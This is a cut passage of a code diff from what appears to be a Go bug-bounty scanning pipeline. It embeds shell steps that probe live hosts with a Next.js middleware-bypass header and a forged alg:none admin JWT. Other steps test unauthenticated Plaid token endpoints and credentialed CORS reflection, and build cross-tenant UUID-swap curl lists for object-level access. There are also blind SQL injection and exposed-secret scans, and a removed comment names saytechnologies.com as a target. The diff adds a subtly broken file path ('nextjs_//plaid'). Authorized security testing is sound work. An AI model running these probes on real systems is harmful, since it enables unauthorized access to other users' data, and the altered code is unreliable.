+	      [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=$ACAO ACAC=$ACAC (credentialed)"
+	    fi
+	  elif [ "$ACAO" = "$ORIGIN" ]; then
+	    [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=REFLECTED ACAC=$ACAC (credentialed exfil)"
+	  fi
+	' 2>/dev/null > cors_findings.txt
+	exit 0`, "grep", []string{"httpx_probe"}, 0},
 		{"dirbrute_ffuf", fmt.Sprintf(`mkdir -p ffuf_results
-if [ -n "%s" ] && [ -s alive.txt ]; then
-  ffuf -w alive.txt:HOST -w %s:WORD -u "HOST/WORD" -mc 200,201,204,301,302,307,308,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_results/all.json -of json -s
-  jq -r '.results[]? | .url' ffuf_results/all.json 2>/dev/null | sort -u > ffuf_dirs_raw.txt
-else
-  : > ffuf_dirs_raw.txt
-fi
-exit 0`, wordlist, wordlist), "default", []string{"httpx_probe"}, 0},
-
-		// 200-only verification of ffuf hits.
+	if [ -n "%s" ] && [ -s alive.txt ]; then
+	  ffuf -w alive.txt:HOST -w %s:WORD -u "HOST/WORD" -mc 200,201,204,301,302,307,308,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_results/all.json -of json -s
+	  jq -r '.results[]? | .url' ffuf_results/all.json 2>/dev/null | sort -u > ffuf_dirs_raw.txt
+	else
+	  : > ffuf_dirs_raw.txt
+	fi
+	exit 0`, wordlist, wordlist), "default", []string{"httpx_probe"}, 0},
 		{"dirbrute_verify_200", "if [ -s ffuf_dirs_raw.txt ]; then httpx -l ffuf_dirs_raw.txt -silent -status-code -mc 200 -o ffuf_dirs_200.txt; else : > ffuf_dirs_200.txt; fi", "grep", []string{"dirbrute_ffuf"}, 0},
-
-		// NEW: scan JS-discovered endpoints against nuclei token-spray/misconfig
 		{"js_endpoints_scan", fmt.Sprintf("%s\nnuclei -l js_endpoints.txt -tags exposure,token-spray,misconfig %s \"${AUTH_HEADERS[@]}\" -o js_endpoint_findings.txt", authSnip, nucleiOptimized), "grep", []string{"merge_js_endpoints"}, 0},
-
-		// === NEW: Next.js / Plaid / JWT-specific probes ===
-		// Targeted checks for the bug classes that show up most often on
-		// Next.js + Plaid + JWT stacks (which describes saytechnologies.com,
-		// plus most modern SaaS bug-bounty programs):
-		//
-		//  1. Next.js middleware bypass via x-middleware-subrequest header
-		//     (CVE-2025-29927-style). The probe sends the magic header and
-		//     checks if a path that would normally require auth (e.g. /dashboard)
-		//     returns 200 instead of 302/401.
-		//  2. Plaid OAuth/link_token endpoint probe: /plaid/link/token/create,
-		//     /plaid/exchange_public_token. Plaid Link tokens are sensitive
-		//     and frequently leakable via SSR injection.
-		//  3. JWT alg=none: send a forged JWT with header.alg=none and no
-		//     signature to every endpoint containing the word "jwt" or "token"
-		//     in its path. A 200 means the server trusts unsigned tokens.
-		//  4. Next.js source-map leak: GET /_next/static/chunks/*.js.map
-		//     returns 200 = source code disclosure.
 		{"nextjs_plaid_jwt_probe", `set +e
-: > nextjs_plaid_jwt_findings.txt
+	: > nextjs_plaid_jwt_findings.txt
 
-# Detect Next.js hosts from tech_fingerprint.txt or _next URL prefix
-NEXTJS_HOSTS=$( (grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; grep -hE "/_next/" all_urls.txt 2>/dev/null | sed 's|/.*||' | sort -u) | sort -u)
+	# Detect Next.js hosts from tech_fingerprint.txt or _next URL prefix
+	NEXTJS_HOSTS=$( (grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; grep -hE "/_next/" all_urls.txt 2>/dev/null | sed 's|/.*||' | sort -u) | sort -u)
 
-while read HOST; do
-  [ -z "$HOST" ] && continue
-  echo "=== $HOST ===" >> nextjs_plaid_jwt_findings.txt
+	while read HOST; do
+	  [ -z "$HOST" ] && continue
+	  echo "=== $HOST ===" >> nextjs_//plaid_jwt_findings.txt
 
-  # 1. Next.js middleware bypass (CVE-2025-29927). The bypass header is
-  #    x-middleware-subrequest with the value 'middleware:middleware:middleware:middleware:middleware'.
-  #    We probe both a likely-auth-protected path and the index.
-  for PATH in /dashboard /api /admin /settings /account /internal /me /api/user; do
-    BASELINE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
-    BYPASS=$(curl -sk --max-time 6 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
-    if [ "$BASELINE" != "$BYPASS" ] && [ "$BYPASS" = "200" ] && [ "$BASELINE" != "200" ]; then
-      echo "[CRITICAL] $HOST$PATH — Next.js middleware bypass: baseline=$BASELINE bypass=$BYPASS" >> nextjs_plaid_jwt_findings.txt
-    fi
-  done
+	  # 1. Next.js middleware bypass (CVE-2025-29927). The bypass header is
+	  #    x-middleware-subrequest with the value 'middleware:middleware:middleware:middleware:middleware'.
+	  #    We probe both a likely-auth-protected path and the index.
+	  for PATH in /dashboard /api /admin /settings /account /internal /me /api/user; do
+	    BASELINE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+	    BYPASS=$(curl -sk --max-time 6 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+	    if [ "$BASELINE" != "$BYPASS" ] && [ "$BYPASS" = "200" ] && [ "$BASELINE" != "200" ]; then
+	      echo "[CRITICAL] $HOST$PATH — Next.js middleware bypass: baseline=$BASELINE bypass=$BYPASS" >> nextjs_plaid_jwt_findings.txt
+	    fi
+	  done
 
-	  # 2. Plaid endpoint probe. The Plaid Link flow exposes these paths.
-  for ENDPOINT in /plaid/link/token/create /plaid/exchange_public_token /api/plaid/link/token/create /api/plaid/exchange_public_token /plaid_link_token /api/plaid_link_token /auth/refresh-token /api/auth/refresh-token /auth/refresh_token /api/auth/refresh_token /exchange_plaid_token /api/exchange_plaid_token; do
-    CODE=$(curl -sk --max-time 6 -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
-    if [ "$CODE" = "200" ]; then
-      echo "[HIGH] $HOST$ENDPOINT — Plaid/auth-token endpoint returns 200 unauthenticated" >> nextjs_plaid_jwt_findings.txt
-    fi
-  done
+		  # 2. Plaid endpoint probe. The Plaid Link flow exposes these paths.
+	  for ENDPOINT in /plaid/link/token/create /plaid/exchange_public_token /api/plaid/link/token/create /api/plaid/exchange_public_token /plaid_link_token /api/plaid_link_token /auth/refresh-token /api/auth/refresh-token /auth/refresh_token /api/auth/refresh_token /exchange_plaid_token /api/exchange_plaid_token; do
+	    CODE=$(curl -sk --max-time 6 -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+	    if [ "$CODE" = "200" ]; then
+	      echo "[HIGH] $HOST$ENDPOINT — Plaid/auth-token endpoint returns 200 unauthenticated" >> nextjs_plaid_jwt_findings.txt
+	    fi
+	  done
 
-  # 3. JWT alg:none. Forge a header.alg=none token with empty signature.
-  JWT_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
-  for ENDPOINT in /api/me /api/user /api/admin /api/v1/me /api/v2/me /api/v3/me /account /me; do
-    CODE=$(curl -sk --max-time 6 -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
-    case "$CODE" in
-      200) echo "[CRITICAL] $HOST$ENDPOINT — JWT alg:none accepted (200)" >> nextjs_plaid_jwt_findings.txt ;;
-    esac
-  done
+	  # 3. JWT alg:none. Forge a header.alg=none token with empty signature.
+	  JWT_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
+	  for ENDPOINT in /api/me /api/user /api/admin /api/v1/me /api/v2/me /api/v3/me /account /me; do
+	    CODE=$(curl -sk --max-time 6 -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+	    case "$CODE" in
+	      200) echo "[CRITICAL] $HOST$ENDPOINT — JWT alg:none accepted (200)" >> nextjs_plaid_jwt_findings.txt ;;
+	    esac
+	  done
 
-  # 4. Next.js source-map leak
-  SAMPLE_JS=$(curl -sk --max-time 6 "$HOST" 2>/dev/null | grep -oE '/_next/static/chunks/[^"]+\.js' | head -1)
-  if [ -n "$SAMPLE_JS" ]; then
-    CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST${SAMPLE_JS}.map" 2>/dev/null)
-    [ "$CODE" = "200" ] && echo "[MEDIUM] $HOST${SAMPLE_JS}.map — Next.js source map exposed" >> nextjs_plaid_jwt_findings.txt
-  fi
-done <<< "$NEXTJS_HOSTS"
-exit 0`, "grep", []string{"httpx_probe"}, 0},
-
-		// === NEW: Django REST Framework probe ===
-		// consumerapi.saytechnologies.com is DRF (jQuery REST framework bundle
-		// present). DRF is a high-yield IDOR/BOLA target: list endpoints under
-		// /api/v{1,2,3}/ routinely accept any caller's object IDs when the
-		// permission class is IsAuthenticated instead of per-object checks.
-		// Detection: DRF returns a distinctive browsable-API HTML footer
-		// ("Django REST framework"), X-Frame-Options: SAMEORIGIN + the
-		// canonical OPTIONS 405 on GET-only endpoints. Probe:
-		//   1. Detect DRF hosts from the JSON response body / Content-Type
-		//      application/json on /api/v3/ style prefixes + DRF footer
-		//   2. Enumerate list endpoints found in all_urls.txt under /api/vN/
-		//   3. For each list endpoint, record the object-ID-bearing detail URL
-		//      so idor_scan + the hunter's two-account test can swap IDs
-		// Output: drf_findings.txt (detection lines) + drf_idor_targets.txt
+	  # 4. Next.js source-map leak
+	  SAMPLE_JS=$(curl -sk --max-time 6 "$HOST" 2>/dev/null | grep -oE '/_next/static/chunks/[^"]+\.js' | head -1)
+	  if [ -n "$SAMPLE_JS" ]; then
+	    CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST${SAMPLE_JS}.map" 2>/dev/null)
+	    [ "$CODE" = "200" ] && echo "[MEDIUM] $HOST${SAMPLE_JS}.map — Next.js source map exposed" >> nextjs_plaid_jwt_findings.txt
+	  fi
+	done <<< "$NEXTJS_HOSTS"
+	exit 0`, "grep", []string{"httpx_probe"}, 0},
 		{"drf_probe", `set +e
-: > drf_findings.txt
-: > drf_idor_targets.txt
+	: > drf_findings.txt
+	: > drf_idor_targets.txt
 
-# Detect DRF hosts: the browsable API footer is near-unique to DRF.
-DRF_HOSTS=$( (grep -E "django|drf|djangorest" tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; curl -sk --max-time 8 "$(head -1 alive.txt 2>/dev/null)/api/v3/" 2>/dev/null | grep -q "Django REST framework" && echo "" ; true) | grep -v '^$' | sort -u )
+	# Detect DRF hosts: the browsable API footer is near-unique to DRF.
+	DRF_HOSTS=$( (grep -E "django|drf|djangorest" tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; curl -sk --max-time 8 "$(head -1 alive.txt 2>/dev/null)/api/v3/" 2>/dev/null | grep -q "Django REST framework" && echo "" ; true) | grep -v '^$' | sort -u )
 
-# Broaden detection: any alive host whose /api/v3/ (or /api/ /api/v1/ /api/v2/)
-# JSON response carries DRF's signature pagination/links keys, or whose
-# OPTIONS response mentions DRF.
-while read HOST; do
-  [ -z "$HOST" ] && continue
-  echo "$DRF_HOSTS" | grep -qxF "$HOST" && continue
-  for PREFIX in /api/v3/ /api/v2/ /api/v1/ /api/; do
-    # DRF fingerprint: browsable-API footer (HTML) or the DRF pagination +
-    # response-envelope JSON shapes ("next":..., "previous":..., "results":[,
-    # "detail": "Not found.") on a JSON response. A bare "drf" substring is
-    # dropped — it FP'd on unrelated tokens.
-    BODY=$(curl -sk --max-time 8 "$HOST$PREFIX" 2>/dev/null | head -c 30000)
-    if echo "$BODY" | grep -qiE "Django REST framework|rest_framework|\"next\"\s*:\s*\"https?://|\"detail\"\s*:\s*\"Not found|Not found."; then
-      echo "$HOST  django-rest-framework," >> drf_findings.txt
-      continue 2
-    fi
-  done
-done < alive.txt
-sort -u drf_findings.txt -o drf_findings.txt 2>/dev/null
+	# Broaden detection: any alive host whose /api/v3/ (or /api/ /api/v1/ /api/v2/)
+	# JSON response carries DRF's signature pagination/links keys, or whose
+	# OPTIONS response mentions DRF.
+	while read HOST; do
+	  [ -z "$HOST" ] && continue
+	  echo "$DRF_HOSTS" | grep -qxF "$HOST" && continue
+	  for PREFIX in /api/v3/ /api/v2/ /api/v1/ /api/; do
+	    # DRF fingerprint: browsable-API footer (HTML) or the DRF pagination +
+	    # response-envelope JSON shapes ("next":..., "previous":..., "results":[,
+	    # "detail": "Not found.") on a JSON response. A bare "drf" substring is
+	    # dropped — it FP'd on unrelated tokens.
+	    BODY=$(curl -sk --max-time 8 "$HOST$PREFIX" 2>/dev/null | head -c 30000)
+	    if echo "$BODY" | grep -qiE "Django REST framework|rest_framework|\"next\"\s*:\s*\"https?://|\"detail\"\s*:\s*\"Not found|Not found."; then
+	      echo "$HOST  django-rest-framework," >> drf_findings.txt
+	      continue 2
+	    fi
+	  done
+	done < alive.txt
+	sort -u drf_findings.txt -o drf_findings.txt 2>/dev/null
 
-# Enumerate IDOR-prone detail endpoints under /api/vN/ on DRF hosts.
-# List endpoints discovered in all_urls.txt that look like collection roots
-# (no trailing id) are recorded; the hunter tests ID-swaps manually.
-awk '/\/api\/v[0-9]+\// {print}' all_urls.txt 2>/dev/null \
-  | grep -Ei '/(accounts|users|profiles|orders|invoices|payments|cards|loans|holdings|transactions|events|companies|merchants)/' \
-  | sort -u | head -n 1000 > drf_idor_targets.txt
-exit 0`, "grep", []string{"httpx_probe", "merge_all_urls"}, 0},
-
-		// === NEW: DRF / BOLA surface mapping ===
-		// Django REST Framework + similar JSON-API backends frequently have
-		// BOLA (Broken Object Level Authorization) on UUID-shaped query
-		// params like /v3/home-page/qa-events/?company=<uuid>. The probe
-		// strategy is: extract every UUID from all_urls.txt, generate
-		// adjacent UUIDs (flip last nibble), and emit ready-to-curl commands
-		// the hunter can run with two authenticated sessions to compare.
-		// Output: bola_targets.txt with one line per UUID found:
-		//   host<TAB>endpoint<TAB>param_name<TAB>uuid
-		// Plus a companion bola_curl.txt with pre-built curl commands.
+	# Enumerate IDOR-prone detail endpoints under /api/vN/ on DRF hosts.
+	# List endpoints discovered in all_urls.txt that look like collection roots
+	# (no trailing id) are recorded; the hunter tests ID-swaps manually.
+	awk '/\/api\/v[0-9]+\// {print}' all_urls.txt 2>/dev/null \
+	  | grep -Ei '/(accounts|users|profiles|orders|invoices|payments|cards|loans|holdings|transactions|events|companies|merchants)/' \
+	  | sort -u | head -n 1000 > drf_idor_targets.txt
+	exit 0`, "grep", []string{"httpx_probe", "merge_all_urls"}, 0},
 		{"bola_surface_run", `set +e
-: > bola_targets.txt
-: > bola_curl.txt
-: > bola_permutations.txt
-# Match UUIDs in URLs like ?company=<uuid> or /<uuid>/. Capture host, path, param, value.
-grep -oE 'https?://[^ ?&]+\?[a-z_]+=[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' all_urls.txt 2>/dev/null \
-  | while read -r LINE; do
-    URL="${LINE%%\?*}"
-    QS="${LINE#*\?}"
-    PARAM=$(echo "$QS" | cut -d= -f1)
-    UUID=$(echo "$QS" | cut -d= -f2)
-    [ -z "$UUID" ] && continue
-    echo "$URL	$PARAM	$UUID" >> bola_targets.txt
-    # Build ready-to-curl commands: original + 5 adjacent UUIDs (flip last hex digit)
-    ADJ=$(echo "$UUID" | sed 's/.$/1/' ; echo "$UUID" | sed 's/.$/2/' ; echo "$UUID" | sed 's/.$/3/' ; echo "$UUID" | sed 's/.$/a/' ; echo "$UUID" | sed 's/.$/f/')
-    echo "# $URL?$PARAM=$UUID" >> bola_curl.txt
-    while read -r NEW_UUID; do
-      echo "curl -sk --max-time 10 \"$URL?$PARAM=$NEW_UUID\" -o /dev/null -w \"  $NEW_UUID -> %{http_code} %{size_download}B\\n\"" >> bola_curl.txt
-    done <<< "$ADJ"
-    echo "" >> bola_curl.txt
-done
-sort -u bola_targets.txt -o bola_targets.txt 2>/dev/null
+	: > bola_targets.txt
+	: > bola_curl.txt
+	: > bola_permutations.txt
+	# Match UUIDs in URLs like ?company=<uuid> or /<uuid>/. Capture host, path, param, value.
+	grep -oE 'https?://[^ ?&]+\?[a-z_]+=[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' all_urls.txt 2>/dev/null \
+	  | while read -r LINE; do
+	    URL="${LINE%%\?*}"
+	    QS="${LINE#*\?}"
+	    PARAM=$(echo "$QS" | cut -d= -f1)
+	    UUID=$(echo "$QS" | cut -d= -f2)
+	    [ -z "$UUID" ] && continue
+	    echo "$URL	$PARAM	$UUID" >> bola_targets.txt
+	    # Build ready-to-curl commands: original + 5 adjacent UUIDs (flip last hex digit)
+	    ADJ=$(echo "$UUID" | sed 's/.$/1/' ; echo "$UUID" | sed 's/.$/2/' ; echo "$UUID" | sed 's/.$/3/' ; echo "$UUID" | sed 's/.$/a/' ; echo "$UUID" | sed 's/.$/f/')
+	    echo "# $URL?$PARAM=$UUID" >> bola_curl.txt
+	    while read -r NEW_UUID; do
+	      echo "curl -sk --max-time 10 \"$URL?$PARAM=$NEW_UUID\" -o /dev/null -w \"  $NEW_UUID -> %{http_code} %{size_download}B\\n\"" >> bola_curl.txt
+	    done <<< "$ADJ"
+	    echo "" >> bola_curl.txt
+	done
+	sort -u bola_targets.txt -o bola_targets.txt 2>/dev/null
 
-# === Subdomain-aware UUID permutations ===
-# A UUID seen on host-A with param P should also be tested on every OTHER
-# host that accepts the same param P. If the API validates ownership per-
-# company rather than per-session, passing host-B's UUID to host-A's endpoint
-# (or vice versa) is the classic cross-tenant BOLA test. Permutations are
-# bounded: at most 3 foreign UUIDs per (param, host) pair to keep the curl
-# list runnable.
-# Shell implementation: one file per param of all UUIDs seen for it,
-# then emit curl commands for each host+url using up to 3 OTHER UUIDs.
-TMP=$(mktemp -d)
-while IFS="$(printf '\t')" read -r URL PARAM UUID; do
-  echo "$UUID" >> "$TMP/p_$PARAM"
-done < bola_targets.txt
-while IFS="$(printf '\t')" read -r URL PARAM UUID; do
-  OTHERS=$(grep -vxF "$UUID" "$TMP/p_$PARAM" 2>/dev/null | shuf -n 3)
-  [ -z "$OTHERS" ] && continue
-  echo "# cross-tenant: $URL?$PARAM=<foreign-uuid> (original uuid=$UUID)" >> bola_permutations.txt
-  echo "$OTHERS" | while read -r FOREIGN; do
-    echo "curl -sk --max-time 10 \"$URL?$PARAM=$FOREIGN\" -o /dev/null -w \"  foreign=$FOREIGN -> %{http_code} %{size_download}B\\n\"" >> bola_permutations.txt
-  done
-  echo "" >> bola_permutations.txt
-done < bola_targets.txt
-rm -rf "$TMP"
-sort -u bola_permutations.txt -o bola_permutations.txt 2>/dev/null
-exit 0`, "grep", []string{"merge_all_urls"}, 0},
-
-		// manual_review_queue: keyword list tightened so it doesn't false-positive
-		// on `.eot` / `.woff` / `.ttf` font files or on random URL fragments.
-		// Anchored to word boundaries with [/?&=_] so we only match when the
-		// keyword appears as a path segment or query param name.
+	# === Subdomain-aware UUID permutations ===
+	# A UUID seen on host-A with param P should also be tested on every OTHER
+	# host that accepts the same param P. If the API validates ownership per-
+	# company rather than per-session, passing host-B's UUID to host-A's endpoint
+	# (or vice versa) is the classic cross-tenant BOLA test. Permutations are
+	# bounded: at most 3 foreign UUIDs per (param, host) pair to keep the curl
+	# list runnable.
+	# Shell implementation: one file per param of all UUIDs seen for it,
+	# then emit curl commands for each host+url using up to 3 OTHER UUIDs.
+	TMP=$(mktemp -d)
+	while IFS="$(printf '\t')" read -r URL PARAM UUID; do
+	  echo "$UUID" >> "$TMP/p_$PARAM"
+	done < bola_targets.txt
+	while IFS="$(printf '\t')" read -r URL PARAM UUID; do
+	  OTHERS=$(grep -vxF "$UUID" "$TMP/p_$PARAM" 2>/dev/null | shuf -n 3)
+	  [ -z "$OTHERS" ] && continue
+	  echo "# cross-tenant: $URL?$PARAM=<foreign-uuid> (original uuid=$UUID)" >> bola_permutations.txt
+	  echo "$OTHERS" | while read -r FOREIGN; do
+	    echo "curl -sk --max-time 10 \"$URL?$PARAM=$FOREIGN\" -o /dev/null -w \"  foreign=$FOREIGN -> %{http_code} %{size_download}B\\n\"" >> bola_permutations.txt
+	  done
+	  echo "" >> bola_permutations.txt
+	done < bola_targets.txt
+	rm -rf "$TMP"
+	sort -u bola_permutations.txt -o bola_permutations.txt 2>/dev/null
+	exit 0`, "grep", []string{"merge_all_urls"}, 0},
 		{"manual_review_queue", `grep -Ei '/(checkout|cart|payment|invoice|order|orders|subscription|seat|fare|booking|reservation|refund|transfer|withdraw|claim|gift|promo|redeem|upgrade|tier|billing|coupon|voucher|wallet|balance|tax|currency)[/?&=_]' all_urls.txt \
-  | grep -Ev '\.(eot|woff2?|ttf|svg|otf|png|jpe?g|gif|ico|css|js|pdf|map|mp[34])([?#]|$)' \
-  | sort -u > manual_business_logic_review.txt
-exit 0`, "grep", []string{"merge_all_urls"}, 0},
-
-		// === Modern methodology additions (bb-methodology + security-arsenal) ===
-		// waf_detect: cap to 200 hosts to keep wafw00f runtime bounded.
-		// wafw00f issues one HTTP request per host; at 5k hosts with default
-		// socket timeouts this becomes a 30-min+ serial scan. 200 hosts is
-		// enough to fingerprint the WAF vendor(s) in the target's infrastructure.
-		// Do NOT rm waf_targets_tmp.txt at the end: the coverage extractor
-		// sees `> waf_targets_tmp.txt` as a declared output, and an absent
-		// file marks the step failed despite exit_code=0.
+	  | grep -Ev '\.(eot|woff2?|ttf|svg|otf|png|jpe?g|gif|ico|css|js|pdf|map|mp[34])([?#]|$)' \
+	  | sort -u > manual_business_logic_review.txt
+	exit 0`, "grep", []string{"merge_all_urls"}, 0},
 		{"waf_detect", "if command -v wafw00f >/dev/null 2>&1; then head -n 200 alive.txt > waf_targets_tmp.txt; wafw00f -i waf_targets_tmp.txt -o waf_detections.txt || true; else : > waf_targets_tmp.txt; : > waf_detections.txt; fi", "grep", []string{"httpx_probe"}, 0},
 		{"port_scan_naabu", "if command -v naabu >/dev/null 2>&1; then naabu -list alive.txt -top-ports 1000 -rate 1000 -silent -o naabu_ports.txt || true; else : > naabu_ports.txt; fi", "grep", []string{"httpx_probe"}, 0},
-
-		// Hidden parameter discovery (arjun). Cap to 100 hosts — arjun's
-		// batch mode sends many requests per host; beyond 100 the runtime
-		// easily exceeds the step timeout and yields diminishing returns.
 		{"hidden_params_arjun", "if command -v arjun >/dev/null 2>&1 && [ -s alive.txt ]; then head -n 100 alive.txt > arjun_targets_tmp.txt; arjun -i arjun_targets_tmp.txt -oT hidden_params.txt -t 10 --rate-limit 10 || touch hidden_params.txt; rm -f arjun_targets_tmp.txt; else : > hidden_params.txt; fi", "grep", []string{"httpx_probe"}, 0},
-
-		// Modern blind SQLi.
 		{"ghauri_sqli", "if command -v ghauri >/dev/null 2>&1; then { head -n 200 sqli_targets.txt; grep -Ei '[?&](id|uid|order|product|category|page|article|comment|msg)=' sqli_targets.txt; } | sort -u | head -n 100 > ghauri_targets.txt; [ -s ghauri_targets.txt ] && ghauri -m ghauri_targets.txt --batch --level=2 --risk=1 --technique=BT -o ghauri_results.txt || true; else : > ghauri_results.txt; fi", "grep", []string{"sqli_targets_replace"}, 0},
-
-		// ===================================================================
-		// === Phase 1: Wire up the 10 unwritten-into-pipeline finders =====
-		// ===================================================================
-		//
-		// Each is a `go run ./cmd/findings-runner <name> .` invocation.
-		// The dot is the workdir — every stage runs from paths.WorkDir
-		// because executor.RunCommand sets cmd.Dir = workDir.
-
-		// Reflection finder: classify every URL's query param into
-		// html-body / attr-quoted / attr-unquoted / json-value. The
-		// result feeds dalfox with already-confirmed reflection sites
-		// (no need for dalfox to guess). Depends on url_filter_alive
-		// because we probe all_urls_200.txt.
 		{"reflection_run", fmt.Sprintf(`%s reflection . || true
-exit 0`, findingsRunnerRef), "grep", []string{"scope_filter"}, 0},
-
-		// ParamShape (HTTP Parameter Pollution). Probes candidate
-		// object-reference params with 5 distinct shapes (?id=1,
-		// ?id[]=1, ?id=1&id=2, mixed case, null byte) and reports
-		// when the response hashes diverge. Depends on httpx_probe
-		// because it works off alive.txt.
+	exit 0`, findingsRunnerRef), "grep", []string{"scope_filter"}, 0},
 		{"paramshape_run", fmt.Sprintf(`%s paramshape . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// AuthShape (cookie + JWT misconfig). Per-host probe of
-		// Set-Cookie / Authorization. Flags missing HttpOnly/Secure/
-		// SameSite, alg:none JWTs, missing exp claim. Depends on
-		// httpx_probe (needs alive.txt).
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"authshape_run", fmt.Sprintf(`%s authshape . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// Signup-takeover fingerprinting. Probes /signup, /register,
-		// /api/users, etc. for email-verify URL patterns and tokens
-		// in the response. Depends on httpx_probe.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"signup_takeover_run", fmt.Sprintf(`%s signup . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// IDOR surface mapping. Per-parameter roll-up of how many
-		// hosts use each object-reference param and how many distinct
-		// IDs were observed. The hunter uses this to set up two
-		// accounts and test the top-N params for IDOR.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"idor_surface_run", fmt.Sprintf(`%s idor . || true
-exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
-
-		// OAuth redirect_uri bypass audit. Per-host probe of
-		// authorize endpoints + .well-known/openid-configuration.
-		// Emits 5 bypass-class payloads per allowlist entry as
-		// ready-to-curl commands. Manual retest only.
+	exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
 		{"oauth_audit_run", fmt.Sprintf(`%s oauth . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// Race-condition surface + 20-way concurrent probe of the
-		// top-25 candidates. Depends on merge_all_urls so coupon/
-		// transfer/withdraw URLs from wayback + katana are in scope.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"race_scan", fmt.Sprintf(`%s race . || true
-exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
-
-		// Bucket-guess takeover. Reads tech_fingerprint + alive.txt
-		// for org-name candidates; HEAD-tests s3/gcs/azure URLs.
+	exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
 		{"bucket_guess_run", fmt.Sprintf(`%s buckets . || true
-exit 0`, findingsRunnerRef), "grep", []string{"tech_fingerprint"}, 0},
-
-		// Per-service takeover fingerprint (Vercel/Netlify/Fly/
-		// AzSWA). Probes every DNS-resolving host for the canonical
-		// 404 page strings. Depends on httpx_probe so DNS-resolving
-		// hosts from live_subs.txt are available.
+	exit 0`, findingsRunnerRef), "grep", []string{"tech_fingerprint"}, 0},
 		{"takeover_v2_run", fmt.Sprintf(`%s takeoversvc . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// Deep JS bundle mining. Reads js_bundles/, extracts secrets,
-		// POST endpoints, admin paths, S3 URLs, GraphQL mutation
-		// names. Depends on jsmap_scrape which populates js_bundles/.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"js_mine_run", fmt.Sprintf(`%s jsmine . || true
-exit 0`, findingsRunnerRef), "grep", []string{"jsmap_scrape"}, 0},
-
-		// ===================================================================
-		// === Phase 2: New finder modules ==================================
-		// ===================================================================
-
-		// Security headers analysis. Per-host probe of CSP, HSTS,
-		// X-Frame-Options, X-Content-Type-Options, Referrer-Policy,
-		// Permissions-Policy, COOP/COEP/CORP. Missing CSP = reportable
-		// (XSS-class). Depends on httpx_probe.
+	exit 0`, findingsRunnerRef), "grep", []string{"jsmap_scrape"}, 0},
 		{"secheaders_run", fmt.Sprintf(`%s secheaders . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// Backup / sensitive-file probing. Single highest-yield bug
-		// class: exposed .env, .git/config, wp-config.php.bak, db.sql,
-		// id_rsa, aws-credentials, etc. Depends on tech_fingerprint
-		// (so we know which stack-specific paths to add) and httpx_probe.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"backupscan_run", fmt.Sprintf(`%s backupscan . || true
-exit 0`, findingsRunnerRef), "grep", []string{"tech_fingerprint"}, 0},
-
-		// Business-logic surface mapping. Categorizes URLs containing
-		// pricing/coupon/balance/vote/gift/payment/currency keywords
-		// into severity groups; flags suspicious query-param shapes
-		// (quantity=, price=, coupon=, currency=, role=, admin=).
-		// Depends on merge_all_urls.
+	exit 0`, findingsRunnerRef), "grep", []string{"tech_fingerprint"}, 0},
 		{"businesslogic_run", fmt.Sprintf(`%s businesslogic . || true
-exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
-
-		// Host-header injection probe. Sends requests with attacker-
-		// controlled Host / X-Forwarded-Host / X-Original-URL / X-Host
